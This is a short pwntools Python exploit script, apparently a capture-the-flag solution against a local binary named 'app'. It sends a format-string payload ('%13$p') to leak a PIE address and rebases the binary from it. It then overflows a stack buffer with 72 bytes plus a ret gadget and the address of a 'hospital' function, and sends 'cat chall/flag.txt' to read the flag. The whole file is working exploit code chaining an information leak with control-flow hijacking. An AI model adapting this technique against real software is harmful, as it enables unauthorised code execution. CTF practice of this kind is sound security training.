#!/usr/bin/env python3

from pwn import *

context.terminal = 	["tmux", "splitw", "-h"]

path = "./app"
exe = ELF(path)

gdbscript = """
b * ready_reader + 93
c
"""

# io = gdb.debug(path, gdbscript=gdbscript)
io = process(path)

payload = b"%13$p"
io.sendlineafter(b"Username:", payload)
payload = b"B"
io.sendlineafter(b"Password:", payload)

pie_leak = io.recvline().strip().split(b" ")[-1]
pie_leak = int(pie_leak, 16)
info(f"{hex(pie_leak) = }")

exe.address = pie_leak - exe.symbols["main"] - 24
info(f"{hex(exe.address) = }")
info(f"{hex(exe.symbols['hospital']) = }")

ret = exe.address + 0x1016

payload = 72 * b"A"
payload += p64(ret)
payload += p64(exe.symbols['hospital'])
io.sendlineafter(b"already.", payload)

io.recvuntil(b"?!\n")
io.sendline(b"cat chall/flag.txt")
print(io.recvline())
io.close()
# io.interactive()
